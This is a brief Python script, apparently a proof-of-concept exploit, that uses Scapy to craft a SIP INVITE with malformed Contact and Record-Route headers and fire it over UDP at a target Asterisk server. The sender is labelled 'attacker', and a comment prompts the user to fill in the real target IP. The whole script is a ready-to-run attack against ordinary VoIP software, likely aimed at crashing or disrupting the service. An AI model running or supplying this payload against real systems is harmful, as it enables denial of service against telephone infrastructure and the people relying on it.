from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.layers.sip import SIP

def send_malformed_invite(target_ip, target_port=5060, source_ip="192.168.1.100", source_port=5060):
    sip_payload = (
        "INVITE sip:bob@{} SIP/2.0\r\n"
        "Via: SIP/2.0/UDP {}:{};branch=z9hG4bK123456\r\n"
        "Max-Forwards: 70\r\n"
        "From: <sip:attacker@{}>;tag=12345\r\n"
        "To: <sip:bob@{}>\r\n"
        "Call-ID: 123456789@{}\r\n"
        "CSeq: 1 INVITE\r\n"
        "Contact: <sip:.1@{}>\r\n"  # Malformed Contact Header
        "Record-Route: <sip:.1@{}>\r\n"  # Malformed Record-Route Header
        "Content-Type: application/sdp\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    ).format(target_ip, source_ip, source_port, source_ip, target_ip, source_ip, source_ip, source_ip)

    packet = IP(dst=target_ip)/UDP(sport=source_port, dport=target_port)/Raw(load=sip_payload)
    send(packet, verbose=True)

# Set your target Asterisk IP address here
target_asterisk_ip = "192.168.1.200"  # Change this to the actual target

send_malformed_invite(target_asterisk_ip)
